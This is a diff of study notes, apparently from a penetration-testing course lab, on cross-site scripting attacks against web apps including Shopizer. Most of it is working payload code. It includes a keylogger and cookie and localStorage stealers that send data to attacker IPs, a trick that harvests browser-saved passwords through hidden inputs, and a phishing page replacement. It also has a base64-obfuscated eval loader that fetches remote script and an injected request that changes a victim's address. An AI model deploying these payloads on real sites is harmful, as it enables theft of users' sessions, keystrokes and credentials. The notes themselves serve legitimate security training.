@@ -1,6 +1,8 @@
 #### Javascript method
 
-=====
+```
+
+
 function processData(data) {
     data.items.forEach(item => {
       console.log(item)
@@ -16,7 +18,10 @@ let foo = {
   }
 
 processData(foo)
-=====
+
+
+```
+
 
 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions ↩︎
 
@@ -31,25 +36,28 @@ processData(foo)
 
 type "allow pasting" in firefox web console.
 
-====
-let inputs = document.getElementsByTagName("input") 
+```
+
+let inputs = document.getElementsByTagName("input")
 
 for (let input of inputs){
     console.log(input.value)
 }
 
-====
+```
 
 #### key logging
 
-====
+```
+
 function logKey(event){
 	console.log(event.key);
 	fetch("http://192.168.49.51/k?key=" + event.key);
 }
 
 document.addEventListener('keydown', logKey);
-====
+
+```
 
 1
 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Window/location ↩︎
@@ -88,24 +96,28 @@ Host xss.js on kali
 ====
 ##### Encoded Cookie
 nano xss.js
+
 cat xss.js
-----
+```
 let cookie = document.cookie
 
 let encodedCookie = encodeURIComponent(cookie)
 
 fetch("http://192.168.49.51/exfil?data=" + encodedCookie)
-----
+```
 python3 -m http.server 80
 
+sample inputs
+```
 <script src="http://192.168.49.129/xss.js"></script>
 
 <img src=x onerror=fetch("http://192.168.49.129/exfil?data="+encodeURIComponent(document.cookie))>
 
+```
 
 
 ##### Encoded Local Storage
-----
+```
 
 let data = JSON.stringify(localStorage)
 
@@ -113,18 +125,20 @@ let encodedData = encodeURIComponent(data)
 
 fetch("http://192.168.49.51/exfil?data=" + encodedData)
 
-----
+```
 
+sample inputs:
+```
 <script src=http://192.168.49.57/xss.js></script>
 
 <img src=x onerror=fetch("http://192.168.49.57/exfil?data="+encodeURIComponent(JSON.stringify(localStorage)))>
 
-
+```
 #### Keylogging
 
------
+cat xss.js
 
->>> cat xss.js
+```
 
 function logKey(event){
         fetch("http://192.168.49.51/k?key=" + event.key)
@@ -132,41 +146,43 @@ function logKey(event){
 
 document.addEventListener('keydown', logKey);
 
------
-
+```
+sample input:
+```
 <script src=http://192.168.49.57/xss.js></script>
+```
 
 #### Stealing saved passwords
 
-----
+```
 
     let body = document.getElementsByTagName("body")[0]
-  
+
     var u = document.createElement("input");
     u.type = "text";
     u.style.position = "fixed";
     //u.style.opacity = "0";
-  
+
     var p = document.createElement("input");
     p.type = "password";
     p.style.position = "fixed";
     //p.style.opacity = "0";
- 
+
     body.append(u)
     body.append(p)
- 
-    setTimeout(function(){ 
+
+    setTimeout(function(){
             fetch("http://192.168.49.51/k?u=" + u.value + "&p=" + p.value)
      }, 5000);
 
 
-----
+```
 
 <script src=http://192.168.49.57/xss.js></script>
 
 #### Phishing Users
 
-----
+```
 
 fetch("login").then(res => res.text().then(data => {
 	document.getElementsByTagName("html")[0].innerHTML = data
@@ -174,26 +190,27 @@ fetch("login").then(res => res.text().then(data => {
 	document.getElementsByTagName("form")[0].method = "get"
 }))
 
-----
+```
 
  https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions ↩︎
- 
- >>>> cat phishing.js
- 
- ---
- document.getElementsByTagName("html")[0].innerHTML = '<form action="http://192.168.49.57/login" method="get"><div class="container"><label for="uname"><b>Username</b></label><input type="text" placeholder="Enter Username" name="username" required><label for="psw"><b>Password</b></label><input type="password" placeholder="Enter Password" name="password" required><button type="submit">Login</button></div></form>' 
- ---
- 
- >>>> cat login.html
- 
- ---
- <form action="http://192.168.49.57/login" method="get"><div class="container"><label for="uname"><b>Username</b></label><input type="text" placeholder="Enter Username" name="username" required><label for="psw"><b>Password</b></label><input type="password" placeholder="Enter Password" name="password" required><button type="submit">Login</button></div></form>
- ---
- 
-Fetch only brings the content. But does not execute. so we are creating script element.
- 
- <img src=x onerror="const script = document.createElement('script');script.src = 'http://192.168.49.57/phishing.js';script.async = true;document.body.appendChild(script);">
 
+cat phishing.js
+
+```
+ document.getElementsByTagName("html")[0].innerHTML = '<form action="http://192.168.49.57/login" method="get"><div class="container"><label for="uname"><b>Username</b></label><input type="text" placeholder="Enter Username" name="username" required><label for="psw"><b>Password</b></label><input type="password" placeholder="Enter Password" name="password" required><button type="submit">Login</button></div></form>'
+```
+
+ cat login.html
+
+```
+ <form action="http://192.168.49.57/login" method="get"><div class="container"><label for="uname"><b>Username</b></label><input type="text" placeholder="Enter Username" name="username" required><label for="psw"><b>Password</b></label><input type="password" placeholder="Enter Password" name="password" required><button type="submit">Login</button></div></form>
+ ```
+
+Fetch only brings the content. But does not execute. so we are creating script element.
+
+```
+ <img src=x onerror="const script = document.createElement('script');script.src = 'http://192.168.49.57/phishing.js';script.async = true;document.body.appendChild(script);">
+```
 
 #### Shopizer
 
@@ -202,17 +219,18 @@ http://shopizer:8080/shop/category/handbags.html/ref=c:2'+alert(1)+'canary
 
 c:2'+alert(1)+'canary
 
->>>>cat ~/xss/xss.js
+cat ~/xss/xss.js
+
 alert('It worked!');
 
- jQuery.getScript('http://192.168.49.57/xss.js') 
+ jQuery.getScript('http://192.168.49.57/xss.js')
  eval(atob(encoded data))
- 
+
  '+eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDkuNTcveHNzLmpzJyk='))+'
- 
+
  Better solution:
  '+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDkuNTcveHNzLmpzJyk=')))+'
- 
+
  ------
  1
 (PortSwigger, 2021), https://portswigger.net/burp/documentation/desktop/tools/target/site-map ↩︎
@@ -232,19 +250,19 @@ alert('It worked!');
 6
 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval ↩︎
 
------
-Content of xss.js:
 
+Content of xss.js:
+```
 fetch('http://shopizer:8080/shop/customer/updateAddress.html',{
     method: 'POST',
     mode: 'same-origin',
     credentials: 'same-origin',
     headers: {
       'Content-Type':'application/x-www-form-urlencoded'
-    }, 
+    },
     body:'customerId=&billingAddress=false&firstName=hax&lastName=hax&company=&address=hax&city=hax&country=AL&stateProvince=z&postalCode=z&phone=z&submitAddress=Change address'
   })
-  
-  -----
+```
+
 
 Now using reflected XSS vuln, we are updating shipping address.
